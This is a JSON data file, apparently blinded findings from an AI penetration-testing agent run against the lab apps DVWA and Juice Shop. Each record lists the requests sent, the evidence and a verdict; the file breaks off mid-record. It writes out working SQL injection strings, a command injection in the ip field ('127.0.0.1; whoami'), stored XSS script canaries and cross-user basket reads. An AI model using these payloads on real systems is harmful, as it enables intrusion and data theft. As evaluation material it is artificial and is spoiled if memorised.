@@ -1,0 +1,1139 @@
+[
+  {
+    "blind_id": "BLIND-0001",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/sqli/",
+    "method": "GET",
+    "parameter": "id",
+    "cwe": "CWE-89",
+    "title": "SQL Injection in DVWA SQLi module (id parameter, Low security)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET /vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit (dvwa_admin)",
+      "GET /vulnerabilities/sqli/?id=1' AND '1'='2&Submit=Submit (dvwa_admin)"
+    ],
+    "response_evidence": "TRUE condition returned 5 records: admin/admin, Gordon/Brown, Hack/Me, Pablo/Picasso, Bob/Smith. FALSE condition returned zero records (empty User ID result block).",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0002",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/api/BasketItems",
+    "method": "GET",
+    "parameter": "",
+    "cwe": "CWE-639",
+    "title": "Cross-user basket access: BasketItems returns other users' basket items (BOLA)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET /api/BasketItems (session juiceshop_acct1; own_basket_id=6) -> 200",
+      "GET /api/BasketItems (session juiceshop_acct2; own_basket_id=7) -> 200"
+    ],
+    "response_evidence": "acct1 (own basket 6) sees its item {\"ProductId\":1,\"BasketId\":6,\"id\":9,\"quantity\":3}. acct2 (own basket 7) request returned the same full list including acct1's distinct item {\"ProductId\":1,\"BasketId\":6,\"id\":9,\"quantity\":3} (Apple Juice (1000ml), quantity 3) as well as basket 1-5 items and its own {\"ProductId\":2,\"BasketId\":7,\"id\":10,\"quantity\":1}. acct2 therefore retrieved Account 1's seeded basket item (ProductId 1 / Apple Juice, quantity 3). Confirms missing per-user filtering on BasketItems.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0003",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/xss_s/",
+    "method": "POST",
+    "parameter": "mtxMessage",
+    "cwe": "CWE-79",
+    "title": "Stored XSS in DVWA guestbook (mtxMessage, Low security)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST /vulnerabilities/xss_s/ txtName=tester&mtxMessage=<script id=\"test_token\">window.xss_flag=1</script>&btnSign=Sign Guestbook (dvwa_admin)",
+      "browser_navigate /vulnerabilities/xss_s/ (dvwa_admin)",
+      "browser_eval_js window.xss_flag"
+    ],
+    "response_evidence": "Canary (50 chars, exactly within maxlength 50) stored in guestbook and rendered on subsequent page load.",
+    "browser_js_evidence": "window.xss_flag evaluated to 1 in the authenticated Playwright page at http://dvwa/vulnerabilities/xss_s/."
+  },
+  {
+    "blind_id": "BLIND-0004",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/sqli/",
+    "method": "GET",
+    "parameter": "id",
+    "cwe": "CWE-89",
+    "title": "SQL Injection in id parameter of /vulnerabilities/sqli/ (Low security)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://dvwa/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit (session dvwa_admin)",
+      "GET http://dvwa/vulnerabilities/sqli/?id=1' AND '1'='2&Submit=Submit (session dvwa_admin)"
+    ],
+    "response_evidence": "TRUE (1' OR '1'='1): HTTP 200, 5 records: First name: admin / Surname: admin; First name: Gordon / Surname: Brown; First name: Hack / Surname: Me; First name: Pablo / Surname: Picasso; First name: Bob / Surname: Smith. FALSE (1' AND '1'='2): HTTP 200, zero records (page shows 'User ID:' with no ID/First name/Surname rows). Boolean TRUE returns multiple seeded users while FALSE returns none.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0005",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/rest/basket/:id",
+    "method": "GET",
+    "parameter": "id (path)",
+    "cwe": "CWE-639",
+    "title": "Cross-user basket access (BOLA) on GET /rest/basket/:id",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/rest/basket/6 (session juiceshop_acct1; session_info.own_basket_id=6)",
+      "GET http://juiceshop:3000/rest/basket/6 (session juiceshop_acct2; session_info.own_basket_id=7)"
+    ],
+    "response_evidence": "acct1 (own basket 6) -> 200: {\"status\":\"success\",\"data\":{\"id\":6,\"UserId\":22,\"Products\":[{\"id\":1,\"name\":\"Apple Juice (1000ml)\",\"BasketItem\":{\"ProductId\":1,\"BasketId\":6,\"id\":9,\"quantity\":3}}]}}. acct2 (own basket 7, a different user) -> 200 with identical body: id 6, UserId 22, Products: Apple Juice (1000ml), quantity 3. acct2 retrieved Account 1's basket item (Apple Juice (1000ml) x3) that it does not own.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0006",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/ftp/acquisitions.md",
+    "method": "GET",
+    "parameter": "",
+    "cwe": "CWE-200",
+    "title": "Confidential acquisition memo publicly retrievable at /ftp/acquisitions.md",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/ftp/ with Accept: text/html,application/json (session=unauth) -> 200 (listing shows acquisitions.md 909 B)",
+      "GET http://juiceshop:3000/ftp/acquisitions.md (session=unauth) -> 200 text/markdown"
+    ],
+    "response_evidence": "HTTP 200, content-type text/markdown: \"# Planned Acquisitions / > This document is confidential! Do not distribute! / Our company plans to acquire several competitors within the next year. This will have a significant stock market impact as we will elaborate in detail in the following paragraph: ...\" Unauthenticated retrieval of a confidential acquisition memo.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0007",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/ftp/acquisitions.md",
+    "method": "GET",
+    "parameter": "path",
+    "cwe": "CWE-200",
+    "title": "Confidential acquisitions memo exposed via open /ftp/ directory listing",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET /ftp/ Accept: text/html,application/json (unauth) -> listing shows acquisitions.md",
+      "GET /ftp/acquisitions.md (unauth)"
+    ],
+    "response_evidence": "Directory listing at /ftp/ exposes acquisitions.md (909 bytes). Direct GET returned 200 text/markdown: '# Planned Acquisitions > This document is confidential! Do not distribute! Our company plans to acquire several competitors within the next year. This will have a significant stock market impact...'",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0008",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/rest/basket/6",
+    "method": "GET",
+    "parameter": "id",
+    "cwe": "CWE-639",
+    "title": "Cross-user basket access (BOLA) on /rest/basket/:id",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET /rest/basket/6 (juiceshop_acct1, own basket, UserId 22)",
+      "GET /rest/basket/6 (juiceshop_acct2, owns basket 7)"
+    ],
+    "response_evidence": "juiceshop_acct2 retrieved acct1's basket 6 (UserId 22) containing Apple Juice (1000ml), quantity 3 (BasketItem id 9), identical to acct1's own view.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0009",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/ftp/acquisitions.md",
+    "method": "GET",
+    "parameter": "",
+    "cwe": "CWE-200",
+    "title": "Confidential acquisitions memo publicly exposed under /ftp/",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/ftp/ (Accept: text/html,application/json) -> directory listing shows acquisitions.md (observed earlier by Surface Mapper)",
+      "GET http://juiceshop:3000/ftp/acquisitions.md (session unauth) -> 200 text/markdown"
+    ],
+    "response_evidence": "HTTP 200, content-type text/markdown. Body excerpt: \"# Planned Acquisitions\\n\\n> This document is confidential! Do not distribute!\\n\\nOur company plans to acquire several competitors within the next year.\\nThis will have a significant stock market impact...\"",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0010",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/ftp/acquisitions.md",
+    "method": "GET",
+    "parameter": "",
+    "cwe": "CWE-200",
+    "title": "Confidential acquisitions memo retrievable unauthenticated at /ftp/acquisitions.md",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/ftp/ (session unauth) - listing shows acquisitions.md",
+      "GET http://juiceshop:3000/ftp/acquisitions.md (session unauth)"
+    ],
+    "response_evidence": "HTTP 200, content_type text/markdown; body excerpt: '# Planned Acquisitions\\n\\n> This document is confidential! Do not distribute!\\n\\nOur company plans to acquire several competitors within the next year. This will have a significant stock market impact as we will elaborate in detail...'",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0011",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/ftp/acquisitions.md",
+    "method": "GET",
+    "parameter": "",
+    "cwe": "CWE-200",
+    "title": "Confidential acquisitions memo exposed via open /ftp/ directory listing",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET /ftp/ Accept: text/html,application/json (unauth) - listing shows acquisitions.md",
+      "GET /ftp/acquisitions.md (unauth)"
+    ],
+    "response_evidence": "Directory listing at /ftp/ includes acquisitions.md (909 bytes). Direct GET /ftp/acquisitions.md returned 200 text/markdown: '# Planned Acquisitions > This document is confidential! Do not distribute! Our company plans to acquire several competitors within the next year.'",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0012",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/sqli/",
+    "method": "GET",
+    "parameter": "id",
+    "cwe": "CWE-89",
+    "title": "SQL Injection in DVWA SQLi page (id parameter, Low security)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET /vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit (dvwa_admin)",
+      "GET /vulnerabilities/sqli/?id=1' AND '1'='2&Submit=Submit (dvwa_admin)"
+    ],
+    "response_evidence": "TRUE condition returned 5 user records: admin/admin, Gordon/Brown, Hack/Me, Pablo/Picasso, Bob/Smith. FALSE condition (AND '1'='2) returned zero records (no 'ID:' rows rendered).",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0013",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/exec/",
+    "method": "POST",
+    "parameter": "ip",
+    "cwe": "CWE-78",
+    "title": "OS Command Injection in DVWA Command Injection (ping) form (ip parameter)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST http://dvwa/vulnerabilities/exec/ form ip=127.0.0.1; whoami&Submit=Submit (session dvwa_admin)"
+    ],
+    "response_evidence": "Response output after ping statistics block: \"rtt min/avg/max/mdev = 0.022/0.030/0.048/0.010 ms\" followed by \"www-data\". The injected `whoami` output \"www-data\" (the container web-process user) appears in the response, confirming OS command injection.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0014",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/ftp/acquisitions.md",
+    "method": "GET",
+    "parameter": "path",
+    "cwe": "CWE-200",
+    "title": "Confidential acquisitions memo exposed via public /ftp/ directory listing",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET /ftp/ Accept: text/html,application/json (unauth) - directory listing reveals acquisitions.md",
+      "GET /ftp/acquisitions.md (unauth)"
+    ],
+    "response_evidence": "Listing shows acquisitions.md (909 bytes). Direct GET returned 200 text/markdown: '# Planned Acquisitions > This document is confidential! Do not distribute! Our company plans to acquire several competitors within the next year. This will have a significant stock market impact...'",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0015",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/api/Products/",
+    "method": "GET",
+    "parameter": "",
+    "cwe": "CWE-200",
+    "title": "Product listing exposes only public catalog fields (no unauthorized disclosure demonstrated)",
+    "agent_verdict": "rejected",
+    "request_sequence": [
+      "GET http://juiceshop:3000/api/Products/  (session=unauth)"
+    ],
+    "response_evidence": "HTTP 200 {\"status\":\"success\",\"data\":[{\"id\":1,\"name\":\"Apple Juice (1000ml)\",\"description\":\"The all-time classic.\",\"price\":1.99,\"deluxePrice\":0.99,\"image\":\"apple_juice.jpg\",\"createdAt\":\"2026-11-05T13:34:09.212Z\",\"updatedAt\":\"2026-11-05T13:34:09.212Z\",\"deletedAt\":null},{\"id\":2,\"name\":\"Orange Juice (1000ml)\",...},...]. Fields are the public product catalog attributes (id, name, description, price, deluxePrice, image, createdAt, updatedAt, deletedAt). No credentials, user data, or internal-only fields observed in the returned portion. deletedAt was null in all visible records; the body excerpt was truncated, so no soft-deleted records were confirmed either. Criterion for confirmation not met.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0016",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/rest/products/search",
+    "method": "GET",
+    "parameter": "q",
+    "cwe": "CWE-89",
+    "title": "SQL Injection in product search parameter q (boolean-based differential)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/rest/products/search?q=' OR '1'='1  (session=unauth)",
+      "GET http://juiceshop:3000/rest/products/search?q=' AND '1'='2  (session=unauth)"
+    ],
+    "response_evidence": "TRUE (q=' OR '1'='1) -> HTTP 200 {\"status\":\"success\",\"data\":[{\"id\":1,\"name\":\"Apple Juice (1000ml)\",...},{\"id\":24,\"name\":\"Apple Pomace\",...},{\"id\":6,\"name\":\"Banana Juice (1000ml)\",...},{\"id\":42,\"name\":\"Best Juice Shop Salesman Artwork\",...},{\"id\":30,\"name\":\"Carrot Juice (1000ml)\",...},{\"id\":3,\"name\":\"Eggfruit Juice (500ml)\",...},{\"id\":25,\"name\":\"Fruit Press\",...},{\"id\":22,\"name\":\"Green Smoothie\",...},{\"id\":41,\"name\":\"Juice Shop \\\"Permafrost\\\" 2020 Edition\",...} ... (multiple records; body truncated in excerpt). FALSE (q=' AND '1'='2) -> HTTP 200 {\"status\":\"success\",\"data\":[]} (zero records). Differential: TRUE returns the full product catalog while FALSE returns empty, showing the boolean condition is evaluated in the SQL query.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0017",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/sqli/",
+    "method": "GET",
+    "parameter": "id",
+    "cwe": "CWE-89",
+    "title": "SQL Injection in DVWA SQL Injection module (id parameter, Low security)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://dvwa/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit (session dvwa_admin)",
+      "GET http://dvwa/vulnerabilities/sqli/?id=1' AND '1'='2&Submit=Submit (session dvwa_admin)"
+    ],
+    "response_evidence": "TRUE payload (id=1' OR '1'='1, Submit=Submit): HTTP 200, returned 5 records: ID 1' OR '1'='1 First name: admin Surname: admin; First name: Gordon Surname: Brown; First name: Hack Surname: Me; First name: Pablo Surname: Picasso; First name: Bob Surname: Smith. FALSE payload (id=1' AND '1'='2, Submit=Submit): HTTP 200, 'User ID:' block empty with zero records (no First name/Surname rows). Boolean TRUE returns multiple seeded users while FALSE returns zero, meeting the CWE-89 criterion. DB reported as mysql.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0018",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/xss_s/",
+    "method": "POST",
+    "parameter": "mtxMessage",
+    "cwe": "CWE-79",
+    "title": "Stored XSS in DVWA guestbook message field (Low)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST /vulnerabilities/xss_s/ txtName=tester&mtxMessage=<script id=\"test_token\">window.xss_flag=1</script>&btnSign=Sign Guestbook (dvwa_admin)",
+      "browser_navigate http://dvwa/vulnerabilities/xss_s/ (dvwa_admin)",
+      "browser_eval_js window.xss_flag"
+    ],
+    "response_evidence": "Canary (50 chars, within mtxMessage maxlength 50) accepted and persisted to guestbook. On re-rendering the page in an authenticated browser session, the stored script executed.",
+    "browser_js_evidence": "window.xss_flag => 1 on http://dvwa/vulnerabilities/xss_s/"
+  },
+  {
+    "blind_id": "BLIND-0019",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/sqli/",
+    "method": "GET",
+    "parameter": "id",
+    "cwe": "CWE-89",
+    "title": "SQL Injection in User ID lookup (id parameter) at /vulnerabilities/sqli/",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://dvwa/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit (session dvwa_admin, Low)",
+      "GET http://dvwa/vulnerabilities/sqli/?id=1' AND '1'='2&Submit=Submit (session dvwa_admin, Low)"
+    ],
+    "response_evidence": "TRUE (id=1' OR '1'='1): HTTP 200, 5 records: 'First name: admin Surname: admin', 'First name: Gordon Surname: Brown', 'First name: Hack Surname: Me', 'First name: Pablo Surname: Picasso', 'First name: Bob Surname: Smith'. FALSE (id=1' AND '1'='2): HTTP 200, zero records ('User ID:' followed directly by 'More Information'; no 'ID:' / 'First name:' / 'Surname:' entries).",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0020",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/xss_s/",
+    "method": "POST",
+    "parameter": "mtxMessage",
+    "cwe": "CWE-79",
+    "title": "Stored XSS in DVWA guestbook message field (xss_s, Low security)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST http://dvwa/vulnerabilities/xss_s/ (dvwa_admin) form: txtName=verifier, mtxMessage=<script id=\"test_token\">window.xss_flag=1</script> (50 chars), btnSign=Sign Guestbook -> 200",
+      "browser_navigate http://dvwa/vulnerabilities/xss_s/ (dvwa_admin)",
+      "browser_eval_js window.xss_flag"
+    ],
+    "response_evidence": "POST response (200) lists stored entry 'Name: verifier Message: ...' alongside existing 'test: This is a test comment.'; the script payload was accepted server-side unescaped (maxlength=50 on mtxMessage satisfied). Browser rendering of http://dvwa/vulnerabilities/xss_s/ in dvwa_admin: window.xss_flag evaluated to 1.",
+    "browser_js_evidence": "browser_eval_js(\"window.xss_flag\") -> result: 1 (current_url http://dvwa/vulnerabilities/xss_s/)"
+  },
+  {
+    "blind_id": "BLIND-0021",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/ftp/",
+    "method": "GET",
+    "parameter": "Accept: text/html,application/json",
+    "cwe": "CWE-200",
+    "title": "Confidential acquisitions memo exposed via unauthenticated open directory listing /ftp/",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/ftp/ with headers Accept: text/html,application/json (session unauth)",
+      "GET http://juiceshop:3000/ftp/acquisitions.md (session unauth)"
+    ],
+    "response_evidence": "Listing: HTTP 200 'listing directory /ftp/' served unauthenticated, includes entry acquisitions.md (909 bytes). Direct retrieval GET /ftp/acquisitions.md: HTTP 200, text/markdown. Excerpt: '# Planned Acquisitions > This document is confidential! Do not distribute! Our company plans to acquire several competitors within the next year. This will have a significant stock market impact...'. Confidential acquisition memo is publicly retrievable without authentication.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0022",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/xss_s/",
+    "method": "POST",
+    "parameter": "mtxMessage",
+    "cwe": "CWE-79",
+    "title": "Stored XSS in Guestbook message (xss_s, Low security)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST /vulnerabilities/xss_s/ txtName=tester&mtxMessage=<script id=\"test_token\">window.xss_flag=1</script>&btnSign=Sign Guestbook (dvwa_admin)",
+      "browser_navigate http://dvwa/vulnerabilities/xss_s/ (dvwa_admin)",
+      "browser_eval_js window.xss_flag"
+    ],
+    "response_evidence": "Canary stored and rendered on the guestbook page; the script tag is not displayed as text in the rendered message.",
+    "browser_js_evidence": "window.xss_flag evaluated to 1 on http://dvwa/vulnerabilities/xss_s/ in the dvwa_admin browser session."
+  },
+  {
+    "blind_id": "BLIND-0023",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/rest/products/search",
+    "method": "GET",
+    "parameter": "q",
+    "cwe": "CWE-89",
+    "title": "SQL injection in /rest/products/search via q parameter (unauthenticated)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/rest/products/search?q=xyz' AND '1'='2 (unauth) -> 200 {\"status\":\"success\",\"data\":[]}",
+      "GET http://juiceshop:3000/rest/products/search?q=xyz%' OR 1=1 OR name LIKE '% (unauth) -> 200 with product list",
+      "Control (malformed, not used as evidence): q=xyz' OR '1'='1'-- -> 500 SQLITE_ERROR: incomplete input, showing SQL: ...name LIKE '%xyz' OR '1'='1'--%'..."
+    ],
+    "response_evidence": "TRUE condition q=xyz%' OR 1=1 OR name LIKE '% returned status:success with multiple product records (e.g. ids 1 Apple Juice (1000ml), 24 Apple Pomace, 6 Banana Juice (1000ml), 42 Best Juice Shop Salesman Artwork, 30 Carrot Juice (1000ml), 3 Eggfruit Juice (500ml), 25 Fruit Press, 22 Green Smoothie, 41 Juice Shop \"Permafrost\" 2020 Edition, ...). FALSE condition q=xyz' AND '1'='2 returned {\"status\":\"success\",\"data\":[]} (zero records). Additionally, a malformed quote injection produced a SQLITE_ERROR revealing the backend SQL, confirming user input is concatenated into the query.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0024",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/exec/",
+    "method": "POST",
+    "parameter": "ip",
+    "cwe": "CWE-78",
+    "title": "OS command injection in DVWA ping form (ip parameter, Low security)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST /vulnerabilities/exec/ ip=127.0.0.1; whoami&Submit=Submit (dvwa_admin)"
+    ],
+    "response_evidence": "Ping output for 127.0.0.1 followed by the injected command output line 'www-data' (4 packets transmitted, 4 received).",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0025",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/xss_s/",
+    "method": "POST",
+    "parameter": "mtxMessage",
+    "cwe": "CWE-79",
+    "title": "Stored XSS in DVWA Stored Cross Site Scripting guestbook (mtxMessage)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST http://dvwa/vulnerabilities/xss_s/ (session dvwa_admin) form_data: txtName='tester', mtxMessage='<script id=\"test_token\">window.xss_flag=1</script>' (50 chars), btnSign='Sign Guestbook'",
+      "browser_navigate http://dvwa/vulnerabilities/xss_s/ (session dvwa_admin)",
+      "browser_eval_js 'window.xss_flag'"
+    ],
+    "response_evidence": "POST returned HTTP 200 and the guestbook persisted an entry with Name 'tester'. On subsequent GET render in dvwa_admin browser session, the stored entry is present under 'Name: tester'. Canary was accepted at exactly 50 characters (maxlength=50).",
+    "browser_js_evidence": "browser_eval_js(\"window.xss_flag\") on http://dvwa/vulnerabilities/xss_s/ returned result: 1"
+  },
+  {
+    "blind_id": "BLIND-0026",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/rest/basket/6",
+    "method": "GET",
+    "parameter": "id",
+    "cwe": "CWE-639",
+    "title": "Cross-user basket access (BOLA/IDOR) on Juice Shop /rest/basket/:id",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET /rest/basket/6 (juiceshop_acct1) -> own basket, UserId 22",
+      "GET /rest/basket/6 (juiceshop_acct2) -> cross-user access"
+    ],
+    "response_evidence": "juiceshop_acct2 (own_basket_id=7) retrieved basket 6 owned by acct1 (UserId 22), returning Products: 'Apple Juice (1000ml)' quantity 3 (BasketItem id 9).",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0027",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/xss_s/",
+    "method": "POST",
+    "parameter": "mtxMessage",
+    "cwe": "CWE-79",
+    "title": "Stored XSS in DVWA guestbook (mtxMessage, Low security)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST /vulnerabilities/xss_s/ txtName=tester&mtxMessage=<script id=\"test_token\">window.xss_flag=1</script>&btnSign=Sign Guestbook (dvwa_admin)",
+      "browser_navigate http://dvwa/vulnerabilities/xss_s/ (dvwa_admin)",
+      "browser_eval_js window.xss_flag"
+    ],
+    "response_evidence": "Canary (50 chars, within mtxMessage maxlength=50) was persisted and rendered on the guestbook page for subsequent loads.",
+    "browser_js_evidence": "window.xss_flag evaluated to 1 on http://dvwa/vulnerabilities/xss_s/ in dvwa_admin browser session."
+  },
+  {
+    "blind_id": "BLIND-0028",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/sqli/",
+    "method": "GET",
+    "parameter": "id",
+    "cwe": "CWE-89",
+    "title": "SQL Injection in /vulnerabilities/sqli/ via id parameter (Low security)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET /vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit (session dvwa_admin)",
+      "GET /vulnerabilities/sqli/?id=1' AND '1'='2&Submit=Submit (session dvwa_admin)"
+    ],
+    "response_evidence": "TRUE condition (id=1' OR '1'='1) returned 5 user records: 'First name: admin Surname: admin', 'First name: Gordon Surname: Brown', 'First name: Hack Surname: Me', 'First name: Pablo Surname: Picasso', 'First name: Bob Surname: Smith'. FALSE condition (id=1' AND '1'='2) returned zero records (result area shows only 'User ID:' with no ID/First name/Surname entries). SQLi DB: mysql.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0029",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/exec/",
+    "method": "POST",
+    "parameter": "ip",
+    "cwe": "CWE-78",
+    "title": "OS Command Injection in /vulnerabilities/exec/ via ip parameter (Low security)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST /vulnerabilities/exec/ form ip=127.0.0.1; whoami&Submit=Submit (session dvwa_admin, application/x-www-form-urlencoded)"
+    ],
+    "response_evidence": "Ping output of 127.0.0.1 completed (4 packets, 0% loss), followed by the injected command output line 'www-data' immediately before 'More Information'. Pre-block: '...rtt min/avg/max/mdev = 0.019/0.024/0.032/0.004 ms\\nwww-data'.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0030",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/api/Feedbacks/",
+    "method": "POST",
+    "parameter": "comment",
+    "cwe": "CWE-79",
+    "title": "Feedback comment XSS canary - stored comment sanitized to empty; no browser-executable rendering",
+    "agent_verdict": "inconclusive",
+    "request_sequence": [
+      "GET http://juiceshop:3000/rest/captcha/ (session unauth) -> {captchaId:0, captcha:'9+7*10', answer:'79'}",
+      "POST http://juiceshop:3000/api/Feedbacks/ JSON {comment:'<script id=\"test_token\">window.xss_flag=1</script>', rating:3, captchaId:0, captcha:'79', UserId:null} (session unauth)",
+      "GET http://juiceshop:3000/api/Feedbacks/ (session unauth)"
+    ],
+    "response_evidence": "POST returned HTTP 201 with data {\"id\":9,\"comment\":\"\",\"rating\":3,\"UserId\":null}. The subsequent list GET shows feedback id 9 with \"comment\":\"\" (payload stripped by server-side sanitization). The canary was not persisted, so there is no rendered context to execute it. GET /api/Feedbacks/9 requires authorization (401). Browser verification was not run because the stored comment contains no payload. Verdict is inconclusive, not confirmed.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0031",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/rest/basket/6",
+    "method": "GET",
+    "parameter": "id (path)",
+    "cwe": "CWE-639",
+    "title": "Broken object-level authorization: acct2 reads acct1's basket via /rest/basket/{id}",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/rest/basket/6 (session juiceshop_acct1; own_basket_id=6)",
+      "GET http://juiceshop:3000/rest/basket/6 (session juiceshop_acct2; own_basket_id=7)"
+    ],
+    "response_evidence": "acct1 own basket 6: HTTP 200, UserId 22, Products: Apple Juice (1000ml) (ProductId 1), BasketItem id 9, quantity 3. acct2 (own basket is 7, UserId 23) GET /rest/basket/6: HTTP 200, status success, data.id 6, UserId 22, Products: Apple Juice (1000ml), BasketItem id 9, quantity 3. acct2 retrieved acct1's distinct seeded basket item (Apple Juice (1000ml) x3) that does not belong to acct2.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0032",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/exec/",
+    "method": "POST",
+    "parameter": "ip",
+    "cwe": "CWE-78",
+    "title": "OS Command Injection in ip parameter of /vulnerabilities/exec/ (Low security)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST http://dvwa/vulnerabilities/exec/ form ip=127.0.0.1; whoami&Submit=Submit (session dvwa_admin, application/x-www-form-urlencoded)"
+    ],
+    "response_evidence": "HTTP 200. Output contains ping statistics for 127.0.0.1 (4 packets transmitted, 4 received, 0% packet loss), followed by the injected command output line: \"www-data\". Container web-process identity www-data is returned in the response.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0033",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/xss_s/",
+    "method": "POST",
+    "parameter": "mtxMessage",
+    "cwe": "CWE-79",
+    "title": "Stored XSS in guestbook message (mtxMessage) at /vulnerabilities/xss_s/",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST http://dvwa/vulnerabilities/xss_s/ form txtName='xss' (10 char limit respected), mtxMessage='<script id=\"test_token\">window.xss_flag=1</script>' (50 chars), btnSign='Sign Guestbook' (session dvwa_admin, Low)",
+      "browser_navigate http://dvwa/vulnerabilities/xss_s/ (session dvwa_admin)",
+      "browser_eval_js 'window.xss_flag'"
+    ],
